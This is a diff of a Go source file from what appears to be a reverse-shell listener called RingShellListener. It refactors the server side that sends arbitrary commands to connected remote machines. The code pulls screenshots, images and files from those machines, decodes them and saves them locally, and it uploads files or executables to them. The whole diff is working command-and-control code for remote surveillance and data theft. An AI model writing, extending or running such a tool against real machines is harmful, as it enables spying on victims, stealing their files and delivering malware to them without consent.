@@ -1,146 +1,296 @@
 package Server
 
 import (
-	"bufio"
-	"errors"
+	"encoding/base64"
 	"fmt"
-	"io"
 	"log"
-	"net"
 	"os"
-	"strconv"
+	"path/filepath"
 	"strings"
 	"time"
-	"www.github.com/MustafaAbdulazizHamza/RingShellListener/Files"
-	"www.github.com/MustafaAbdulazizHamza/RingShellListener/Pics"
 )
 
-func handle(conn net.Conn, id string) {
-	defer conn.Close()
-	reader := bufio.NewReader(conn)
-	writer := bufio.NewWriter(conn)
-	for {
-		cmd, ok := <-chs[id]
-		if !ok {
-			break
-		}
-		commands := strings.Split(cmd, " ")
-		if commands[0] == "get" {
-			if commands[1] == "screenshots" {
-				conn.SetDeadline(time.Now().Add(timeout))
-				if err := sendCmd("get screenshots", writer); err != nil {
-					log.Println("Unable to send the command:", err)
-					break
-				}
-				conn.SetDeadline(time.Now().Add(timeout))
-				ssN, err := reader.ReadString('\n')
-				if err != nil {
-					log.Println("Unable to get the number of screenshots:", err)
-					break
-				}
-				NumberOfScreenshots, err := strconv.Atoi(strings.TrimSpace(ssN))
-				if err != nil {
-					log.Println("Unable to convert the number of screenshots to int:", err)
-					break
-				}
-				for i := 0; i < NumberOfScreenshots; i++ {
-					now := time.Now()
-					if err := Pics.ReceiveAndSaveImage(conn, outputDir, fmt.Sprintf("screenshot-%s-%d.png", now.Format("2006-01-02_15:04:05"), i)); err != nil {
-						log.Println(err)
-						break
-					}
-				}
+func sendCommand(id string, cmd string) {
+	mu.RLock()
+	ch, exists := chs[id]
+	mu.RUnlock()
 
-			} else if commands[1] == "image" {
-				conn.SetDeadline(time.Now().Add(timeout))
-				if err := sendCmd(cmd, writer); err != nil {
-					log.Println("Unable to send the command:", err)
-					break
-				}
-
-				for _, imageName := range commands[2:] {
-					err := Pics.ReceiveAndSaveImage(conn, outputDir, imageName)
-					if errors.Is(err, os.ErrNotExist) {
-						log.Printf("Image %s was not found.\n", imageName)
-						continue
-					} else if err != nil {
-						log.Println(err)
-						break
-					}
-				}
-			} else if commands[1] == "file" {
-				conn.SetDeadline(time.Now().Add(timeout))
-				if err := sendCmd(cmd, writer); err != nil {
-					log.Println("Unable to send the command:", err)
-					break
-				}
-				for _, fileName := range commands[2:] {
-					err := Files.ReceiveFileContents(fmt.Sprintf("%s/%s", outputDir, fileName), conn, timeout)
-					if errors.Is(err, os.ErrNotExist) {
-						log.Printf("The file %s was not found on the remote machine.\n", fileName)
-						continue
-					}
-					if err != nil {
-						log.Println(err)
-						break
-					}
-				}
-			}
-
-		} else if commands[0] == "upload" {
-			if commands[1] == "file" || commands[1] == "executable" {
-				files := FileNamesParser(commands)
-				conn.SetDeadline(time.Now().Add(timeout))
-				if err := sendCmd(fmt.Sprintf("upload %s %s", commands[1], files), writer); err != nil {
-					log.Println("Unable to send the command:", err)
-					break
-				}
-				for _, fi := range commands[2:] {
-					if err := Files.SendFileContents(fi, conn, timeout); errors.Is(err, os.ErrNotExist) {
-						log.Printf("The file %s was not found on your local machine.\n", fi)
-						continue
-					} else if err != nil {
-						log.Println("Unable to upload file:", err)
-						break
-					}
-				}
-			} else {
-				log.Println("You have entered an illegal upload command.")
-			}
-		} else {
-			conn.SetDeadline(time.Now().Add(timeout))
-			if err := sendCmd(cmd, writer); err != nil {
-				chs[id] <- fmt.Sprint("Unable to send the command:", err)
-				break
-			}
-			var (
-				output  strings.Builder
-				isError bool = false
-			)
-			for {
-				conn.SetDeadline(time.Now().Add(timeout))
-				out := make([]byte, 1024)
-				n, err := reader.Read(out)
-				if err == io.EOF {
-					break
-				}
-				if err != nil {
-					isError = true
-					chs[id] <- fmt.Sprint("Unable to receive the output:", err)
-					break
-				}
-				output.Write(out)
-				if n < 1024 {
-					break
-				}
-			}
-			if isError {
-				break
-			}
-			chs[id] <- output.String()
-		}
+	if !exists {
+		log.Println("Session not found:", id)
+		return
 	}
 
-	closeConnectionStuff(id)
+	ch <- cmd
+}
 
+func receiveResponse(id string) string {
+	mu.RLock()
+	ch, exists := chs[id]
+	mu.RUnlock()
+
+	if !exists {
+		return "Session not found"
+	}
+
+	select {
+	case output := <-ch:
+		return output
+	default:
+		return ""
+	}
+}
+
+func handleCommand(id string, input string) {
+	commands := parseCommand(input)
+	if len(commands) == 0 {
+		return
+	}
+
+	switch commands[0] {
+	case "get":
+		if len(commands) < 2 {
+			log.Println("Invalid get command")
+			return
+		}
+		handleGetCommand(id, commands)
+	case "upload":
+		if len(commands) < 3 {
+			log.Println("Invalid upload command")
+			return
+		}
+		handleUploadCommand(id, commands)
+	default:
+		sendCommand(id, input)
+		output := waitForResponseBlocking(id)
+		fmt.Println(output)
+	}
+}
+
+func handleGetCommand(id string, commands []string) {
+	if len(commands) < 2 {
+		fmt.Println("Invalid get command")
+		return
+	}
+
+	var cmdParts []string
+	for _, part := range commands {
+		if strings.Contains(part, " ") {
+			cmdParts = append(cmdParts, fmt.Sprintf("\"%s\"", part))
+		} else {
+			cmdParts = append(cmdParts, part)
+		}
+	}
+	cmd := strings.Join(cmdParts, " ")
+	
+	fmt.Println("Sending get command, waiting for response...")
+	sendCommand(id, cmd)
+	
+	output := waitForResponseBlocking(id)
+	
+	if output == "" {
+		fmt.Println("No response received or timeout")
+		return
+	}
+	
+	if strings.HasPrefix(output, "Error:") {
+		fmt.Println(output)
+		return
+	}
+	
+	switch commands[1] {
+	case "screenshots":
+		if err := saveScreenshots(output); err != nil {
+			fmt.Println("Error saving screenshots:", err)
+		} else {
+			fmt.Println("Screenshots saved successfully")
+		}
+	case "image":
+		if err := saveImages(output, commands[2:]); err != nil {
+			fmt.Println("Error saving images:", err)
+		} else {
+			fmt.Println("Images saved successfully")
+		}
+	case "file":
+		if err := saveFiles(output, commands[2:]); err != nil {
+			fmt.Println("Error saving files:", err)
+		} else {
+			fmt.Println("Files saved successfully")
+		}
+	default:
+		fmt.Println(output)
+	}
+}
+
+func handleUploadCommand(id string, commands []string) {
+	cmd := strings.Join(commands, " ")
+	sendCommand(id, cmd)
+	log.Println("Upload command sent:", cmd)
+}
+
+func waitForResponse(id string) string {
+	mu.RLock()
+	ch, exists := respChs[id]
+	mu.RUnlock()
+
+	if !exists {
+		return "Session not found"
+	}
+
+	select {
+	case output := <-ch:
+		return output
+	default:
+		return ""
+	}
+}
+
+func waitForResponseBlocking(id string) string {
+	mu.RLock()
+	ch, exists := respChs[id]
+	mu.RUnlock()
+
+	if !exists {
+		return "Session not found"
+	}
+
+	select {
+	case output := <-ch:
+		return output
+	case <-time.After(5 * time.Minute):
+		return ""
+	}
+}
+
+func saveScreenshots(output string) error {
+	if strings.HasPrefix(output, "Error:") {
+		return fmt.Errorf(output)
+	}
+	
+	lines := strings.Split(output, "\n")
+	for _, line := range lines {
+		if line == "" {
+			continue
+		}
+		
+		parts := strings.SplitN(line, ":", 2)
+		if len(parts) != 2 {
+			continue
+		}
+		
+		filename := parts[0] + ".png"
+		data, err := base64.StdEncoding.DecodeString(parts[1])
+		if err != nil {
+			return fmt.Errorf("failed to decode %s: %w", filename, err)
+		}
+		
+		filePath := filepath.Join(outputDir, filename)
+		if err := os.WriteFile(filePath, data, 0644); err != nil {
+			return fmt.Errorf("failed to save %s: %w", filename, err)
+		}
+		fmt.Printf("Saved: %s\n", filePath)
+	}
+	return nil
+}
+
+func saveImages(output string, requestedFiles []string) error {
+	if strings.HasPrefix(output, "Error:") {
+		return fmt.Errorf(output)
+	}
+	
+	sections := strings.Split(output, "\n---\n")
+	for i, section := range sections {
+		if section == "" {
+			continue
+		}
+		
+		parts := strings.SplitN(section, ": ", 2)
+		if len(parts) != 2 {
+			fmt.Println(section)
+			continue
+		}
+		
+		originalName := parts[0]
+		if strings.Contains(parts[1], "error:") {
+			fmt.Printf("%s: %s\n", originalName, parts[1])
+			continue
+		}
+		
+		data, err := base64.StdEncoding.DecodeString(parts[1])
+		if err != nil {
+			return fmt.Errorf("failed to decode %s: %w", originalName, err)
+		}
+		
+		filename := originalName
+		if i < len(requestedFiles) {
+			filename = filepath.Base(requestedFiles[i])
+		}
+		
+		filePath := filepath.Join(outputDir, filename)
+		if err := os.WriteFile(filePath, data, 0644); err != nil {
+			return fmt.Errorf("failed to save %s: %w", filename, err)
+		}
+		fmt.Printf("Saved: %s\n", filePath)
+	}
+	return nil
+}
+
+func saveFiles(output string, requestedFiles []string) error {
+	if strings.HasPrefix(output, "Error:") {
+		return fmt.Errorf(output)
+	}
+	
+	sections := strings.Split(output, "\n---\n")
+	for i, section := range sections {
+		if section == "" {
+			continue
+		}
+		
+		parts := strings.SplitN(section, ": ", 2)
+		if len(parts) != 2 {
+			fmt.Println(section)
+			continue
+		}
+		
+		originalName := parts[0]
+		if strings.Contains(parts[1], "error:") {
+			fmt.Printf("%s: %s\n", originalName, parts[1])
+			continue
+		}
+		
+		data, err := base64.StdEncoding.DecodeString(parts[1])
+		if err != nil {
+			return fmt.Errorf("failed to decode %s: %w", originalName, err)
+		}
+		
+		filename := originalName
+		if i < len(requestedFiles) {
+			filename = filepath.Base(requestedFiles[i])
+		}
+		
+		filePath := filepath.Join(outputDir, filename)
+		if err := os.WriteFile(filePath, data, 0644); err != nil {
+			return fmt.Errorf("failed to save %s: %w", filename, err)
+		}
+		fmt.Printf("Saved: %s\n", filePath)
+	}
+	return nil
+}
+
+func closeConnectionStuff(id string) {
+	mu.Lock()
+	if ch, exists := chs[id]; exists {
+		close(ch)
+		delete(chs, id)
+	}
+	if respCh, exists := respChs[id]; exists {
+		close(respCh)
+		delete(respChs, id)
+	}
+	if _, exists := dt[id]; exists {
+		delete(dt, id)
+	}
+	if CId == id {
+		CId = ""
+	}
+	mu.Unlock()
 }
